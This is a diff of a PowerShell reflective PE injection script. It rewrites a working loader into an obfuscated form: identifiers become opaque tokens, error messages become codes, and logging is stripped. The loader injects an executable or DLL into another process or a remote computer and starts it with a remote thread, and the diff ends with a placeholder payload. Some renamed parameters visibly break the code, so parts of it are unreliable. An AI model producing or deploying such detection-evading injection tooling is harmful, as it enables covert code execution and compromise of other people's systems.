+                    $Success = $VAR0042.FUN045.Invoke($VAR0161, $VAR0178, $VAR0173, [UIntPtr][UInt64]$VAR0171, [Ref]$VAR0167)
+                    if (($Success -eq $false) -or ([UInt64]$VAR0167 -ne [UInt64]$VAR0171)) {
+                        Throw "ERROR61"
                     }
 
-                    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
+                    $VAR0179 = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0178 -VAR0042 $VAR0042
+                    $VAR0144 = $VAR0042.FUN044.Invoke($VAR0179, 20000)
+                    if ($VAR0144 -ne 0) {
+                        Throw "ERROR62"
+                    }
+
+                    $VAR0042.FUN039.Invoke($VAR0161, $VAR0178, [UIntPtr][UInt64]0, $VAR0041.CONST025) | Out-Null
                 }
             }
-            elseif ($PEInfo.FileType -ieq "EXE") {
+            elseif ($VAR0126.CONST037 -ieq "Executable") {
                 
-                [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
-                [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
-                $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr
+                [IntPtr]$VAR0228 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
+                [System.Runtime.InteropServices.Marshal]::WriteByte($VAR0228, 0, 0x00)
+                $VAR0286 = FUN025 -VAR0126 $VAR0126 -VAR0042 $VAR0042 -VAR0041 $VAR0041 -VAR0227 $VAR004 -VAR0228 $VAR0228
 
                 
                 
-                [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
-                Write-Verbose "Call EXE Main function. Address: $(Get-Hex $ExeMainPtr). Creating thread for the EXE to run in."
-
-                $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
+                [IntPtr]$VAR0287 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
+                
+                $VAR0042.FUN056.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $VAR0287, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
 
                 while ($true) {
-                    [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
-                    if ($ThreadDone -eq 1) {
-                        Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
-                        Write-Verbose "EXE thread has completed."
+                    [Byte]$VAR0288 = [System.Runtime.InteropServices.Marshal]::ReadByte($VAR0228, 0)
+                    if ($VAR0288 -eq 1) {
+                        FUN026 -VAR0261 $VAR0286 -VAR0042 $VAR0042 -VAR0041 $VAR0041
                         break
                     }
                     else {
@@ -2248,96 +2210,88 @@ function Invoke-PEInject {
                 }
             }
 
-            return @($PEInfo.PEHandle, $EffectivePEHandle)
+            return @($VAR0126.VAR0263, $VAR0279)
         }
 
 
-        Function Invoke-MemoryFreeLibrary {
+        Function FUN029 {
             Param(
                 [Parameter(Position = 0, Mandatory = $true)]
                 [IntPtr]
-                $PEHandle
+                $VAR0263
             )
 
             
-            $Win32Constants = Get-Win32Constants
-            $Win32Functions = Get-Win32Functions
-            $Win32Types = Get-Win32Types
+            $VAR0041 = FUN002
+            $VAR0042 = FUN003
+            $VAR010 = FUN001
 
-            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
+            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
 
             
-            if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0) {
-                [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
+            if ($VAR0126.CONST031.CONST122.CONST108.Size -gt 0) {
+                [IntPtr]$VAR0211 = FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0126.CONST031.CONST122.CONST108.CONST074)
 
                 while ($true) {
-                    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
+                    $VAR0212 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($VAR0211, [Type]$VAR010.CONST152)
 
                     
-                    if ($ImportDescriptor.Characteristics -eq 0 `
-                            -and $ImportDescriptor.FirstThunk -eq 0 `
-                            -and $ImportDescriptor.ForwarderChain -eq 0 `
-                            -and $ImportDescriptor.Name -eq 0 `
-                            -and $ImportDescriptor.TimeDateStamp -eq 0) {
-                        Write-Verbose "Done unloading the libraries needed by the PE"
+                    if ($VAR0212.CONST067 -eq 0 `
+                            -and $VAR0212.CONST154 -eq 0 `
+                            -and $VAR0212.CONST153 -eq 0 `
+                            -and $VAR0212.Name -eq 0 `
+                            -and $VAR0212.CONST071 -eq 0) {
                         break
                     }
 
-                    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
-                    $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)
+                    $VAR0164 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((FUN005 ([Int64]$VAR0126.VAR0263) ([Int64]$VAR0212.Name)))
+                    $VAR0213 = $VAR0042.FUN041.Invoke($VAR0164)
 
-                    if ($ImportDllHandle -eq $null) {
-                        Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
-                    }
+                    
 
-                    $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
-                    if ($Success -eq $false) {
-                        Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
-                    }
+                    $Success = $VAR0042.FUN042.Invoke($VAR0213)
+                    
 
-                    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
+                    $VAR0211 = FUN005 ($VAR0211) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$VAR010.CONST152))
                 }
             }
 
             
-            Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
-            $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
-            $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
-            $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
+            $VAR0280 = FUN005 ($VAR0126.VAR0263) ($VAR0126.CONST031.CONST122.CONST060)
+            $VAR0281 = FUN011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
+            $VAR0282 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0280, $VAR0281)
 
-            $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
+            $VAR0282.Invoke($VAR0126.VAR0263, 0, [IntPtr]::Zero) | Out-Null
 
 
-            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
-            if ($Success -eq $false) {
-                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
-            }
+            $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
+            
         }
 
 
-        Function Main {
-            $Win32Functions = Get-Win32Functions
-            $Win32Types = Get-Win32Types
-            $Win32Constants = Get-Win32Constants
+        Function FUN030 {
+            $VAR0042 = FUN003
+            $VAR010 = FUN001
+            $VAR0041 = FUN002
 
-            $RemoteProcHandle = [IntPtr]::Zero
+            $VAR0161 = [IntPtr]::Zero
 
             
-            if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne "")) {
-                Throw "Can't supply a ProcId and ProcName, choose one or the other"
+            if (($VAR005 -ne $null) -and ($VAR005 -ne 0) -and ($VAR006 -ne $null) -and ($VAR006 -ne "")) {
+                Throw "ERROR64"
             }
-            elseif ($ProcName -ne $null -and $ProcName -ne "") {
-                $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
-                if ($Processes.Count -eq 0) {
-                    Throw "Can't find process $ProcName"
+            elseif ($VAR006 -ne $null -and $VAR006 -ne "") {
+                $VAR0289 = @(Get-Process -Name $VAR006 -ErrorAction SilentlyContinue)
+                if ($VAR0289.Count -eq 0) {
+                    Throw "ERROR65 $VAR006"
                 }
-                elseif ($Processes.Count -gt 1) {
-                    $ProcInfo = Get-Process | Where-Object { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
-                    Write-Output $ProcInfo
-                    Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
+                elseif ($VAR0289.Count -gt 1) {
+                    $VAR0290 = Get-Process | Where-Object { $_.Name -eq $VAR006 } | Select-Object ProcessName, Id, SessionId
+                    Write-Output $VAR0290
+                    Throw "ERROR66 $VAR006"
                 }
                 else {
-                    $ProcId = $Processes[0].ID
+                    $VAR005 = $VAR0289[0].ID
                 }
             }
 
@@ -2349,78 +2303,75 @@ function Invoke-PEInject {
             
             
 
-            if (($ProcId -ne $null) -and ($ProcId -ne 0)) {
-                $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
-                if ($RemoteProcHandle -eq [IntPtr]::Zero) {
-                    Throw "Couldn't obtain the handle for process ID: $ProcId"
+            if (($VAR005 -ne $null) -and ($VAR005 -ne 0)) {
+                $VAR0161 = $VAR0042.FUN043.Invoke(0x001F0FFF, $false, $VAR005)
+                if ($VAR0161 -eq [IntPtr]::Zero) {
+                    Throw "ERROR67: $VAR005"
                 }
 
-                Write-Verbose "Got the handle for the remote process to inject in to"
             }
 
 
             
-            Write-Verbose "Calling Invoke-MemoryLoadLibrary"
-            $PEHandle = [IntPtr]::Zero
-            if ($RemoteProcHandle -eq [IntPtr]::Zero) {
-                $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -ForceASLR $ForceASLR
+            $VAR0263 = [IntPtr]::Zero
+            if ($VAR0161 -eq [IntPtr]::Zero) {
+                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR007 $VAR007
             }
             else {
-                $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle -ForceASLR $ForceASLR
+                $VAR0291 = FUN028 -VAR001 $VAR001 -VAR004 $VAR004 -VAR0161 $VAR0161 -VAR007 $VAR007
             }
-            if ($PELoadedInfo -eq [IntPtr]::Zero) {
-                Throw "Unable to load PE, handle returned is NULL"
+            if ($VAR0291 -eq [IntPtr]::Zero) {
+                Throw "ERROR68"
             }
 
-            $PEHandle = $PELoadedInfo[0]
-            $RemotePEHandle = $PELoadedInfo[1] 
+            $VAR0263 = $VAR0291[0]
+            $VAR0292 = $VAR0291[1] 
 
 
             
-            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
-            if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero)) {
+            $VAR0126 = FUN017 -VAR0263 $VAR0263 -VAR010 $VAR010 -VAR0041 $VAR0041
+            if (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -eq [IntPtr]::Zero)) {
                 
                 
                 
-                switch ($FuncReturnType) {
-                    'WString' {
-                        Write-Verbose "Calling function with WString return type"
-                        [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "WStringFunc"
-                        if ($WStringFuncAddr -eq [IntPtr]::Zero) {
-                            Throw "Couldn't find function address."
+                switch ($VAR003) {
+                    'WideStr' {
+                        
+                        [IntPtr]$VAR0293 = FUN027 -VAR0263 $VAR0263 -FunctionName "WideStrFunc"
+                        if ($VAR0293 -eq [IntPtr]::Zero) {
+                            Throw "ERROR67"
                         }
-                        $WStringFuncDelegate = Get-DelegateType @() ([IntPtr])
-                        $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
-                        [IntPtr]$OutputPtr = $WStringFunc.Invoke()
-                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
-                        Write-Output $Output
+                        $VAR0294 = FUN011 @() ([IntPtr])
+                        $VAR0295 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0293, $VAR0294)
+                        [IntPtr]$VAR0296 = $VAR0295.Invoke()
+                        $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($VAR0296)
+                        Write-Output $VAR0297
                     }
 
-                    'String' {
-                        Write-Verbose "Calling function with String return type"
-                        [IntPtr]$StringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "StringFunc"
-                        if ($StringFuncAddr -eq [IntPtr]::Zero) {
-                            Throw "Couldn't find function address."
+                    'Str' {
+
+                        [IntPtr]$VAR0298 = FUN027 -VAR0263 $VAR0263 -FunctionName "StringFunc"
+                        if ($VAR0298 -eq [IntPtr]::Zero) {
+                            Throw "ERROR68"
                         }
-                        $StringFuncDelegate = Get-DelegateType @() ([IntPtr])
-                        $StringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($StringFuncAddr, $StringFuncDelegate)
-                        [IntPtr]$OutputPtr = $StringFunc.Invoke()
-                        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($OutputPtr)
-                        Write-Output $Output
+                        $VAR0299 = FUN011 @() ([IntPtr])
+                        $VAR0300 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0298, $VAR0299)
+                        [IntPtr]$VAR0296 = $VAR0300.Invoke()
+                        $VAR0297 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($VAR0296)
+                        Write-Output $VAR0297
                     }
 
-                    'Void' {
-                        Write-Verbose "Calling function with Void return type"
-                        [IntPtr]$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
-                        if ($VoidFuncAddr -eq [IntPtr]::Zero) {
-                            Throw "Couldn't find function address."
+                    'NoOutput' {
+                        [IntPtr]$VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
+                        if ($VAR0301 -eq [IntPtr]::Zero) {
+                            Throw "ERROR69"
                         }
-                        $VoidFuncDelegate = Get-DelegateType @() ([Void])
-                        $VoidFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VoidFuncAddr, $VoidFuncDelegate)
-                        $VoidFunc.Invoke() | Out-Null
+                        $VAR0302 = FUN011 @() ([Void])
+                        $VAR0303 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAR0301, $VAR0302)
+                        $VAR0303.Invoke() | Out-Null
                     }
-                    'None' {
-                        Write-Verbose "Not calling any function. Leaving it all to DllMain(DLL_PROCESS_ATTACH)."
+                    'DefaultSettings' {
+                        Write-Verbose "ERROR70"
                     }
                 }
                 
@@ -2428,80 +2379,67 @@ function Invoke-PEInject {
                 
             }
             
-            elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero)) {
-                $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
-                if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero)) {
-                    Throw "VoidFunc couldn't be found in the DLL"
+            elseif (($VAR0126.CONST037 -ieq "Library") -and ($VAR0161 -ne [IntPtr]::Zero)) {
+                $VAR0301 = FUN027 -VAR0263 $VAR0263 -FunctionName "VoidFunc"
+                if (($VAR0301 -eq $null) -or ($VAR0301 -eq [IntPtr]::Zero)) {
+                    Throw "ERROR71"
                 }
 
-                $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
-                $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
+                $VAR0301 = FUN004 $VAR0301 $VAR0263
+                $VAR0301 = FUN005 $VAR0301 $VAR0292
 
                 
-                $Null = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
+                $Null = FUN014 -ProcessHandle $VAR0161 -VAR0127 $VAR0301 -VAR0042 $VAR0042
             }
 
             
             
-            if ($RemoteProcHandle -eq [IntPtr]::Zero -and $PEInfo.FileType -ieq "DLL") {
-                Invoke-MemoryFreeLibrary -PEHandle $PEHandle
+            if ($VAR0161 -eq [IntPtr]::Zero -and $VAR0126.CONST037 -ieq "Library") {
+                FUN029 -VAR0263 $VAR0263
             }
             else {
                 
-                $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
-                if ($Success -eq $false) {
-                    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
-                }
+                $Success = $VAR0042.FUN038.Invoke($VAR0263, [UInt64]0, $VAR0041.CONST025)
+                
             }
 
-            Write-Verbose "Done!"
         }
 
-        Main
+        FUN030
     }
 
     
-    Function Main {
-        if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent) {
-            $DebugPreference = "Continue"
-        }
-
-        Write-Verbose "PowerShell ProcessID: $PID"
-
+    Function FUN030 {
         
-        $e_magic = ($PEBytes[0..1] | ForEach-Object { [Char] $_ }) -join ''
 
-        if ($e_magic -ne 'MZ') {
-            throw 'PE is not a valid PE file.'
-        }
 
-        if (-not $DoNotZeroMZ) {
+        if (-not $VAR008) {
             
             
-            $PEBytes[0] = 0
-            $PEBytes[1] = 0
+            $VAR001[0] = 0
+            $VAR001[1] = 0
         }
 
         
-        if ($ExeArgs -ne $null -and $ExeArgs -ne '') {
-            $ExeArgs = "ReflectiveExe $ExeArgs"
+        if ($VAR004 -ne $null -and $VAR004 -ne '') {
+            $VAR004 = "VAR0305 $VAR004"
         }
         else {
-            $ExeArgs = "ReflectiveExe"
+            $VAR004 = "VAR0305"
         }
 
-        if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$") {
-            Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName, $ForceASLR, $ExeArgs)
+        if ($VAR002 -eq $null -or $VAR002 -imatch "^\s*$") {
+            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004)
         }
         else {
-            Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes, $FuncReturnType, $ProcId, $ProcName, $ForceASLR, $ExeArgs) -ComputerName $ComputerName
+            Invoke-Command -ScriptBlock $VAR009 -ArgumentList @($VAR001, $VAR003, $VAR005, $VAR006, $VAR007, $VAR004) -VAR002 $VAR002
         }
     }
 
-    Main
+    FUN030
 }
 
 $Bytes = QWERQWERQWER
-Invoke-PEInject -PEBytes $Bytes
+FUN000 -VAR0001 $Bytes
 
 """
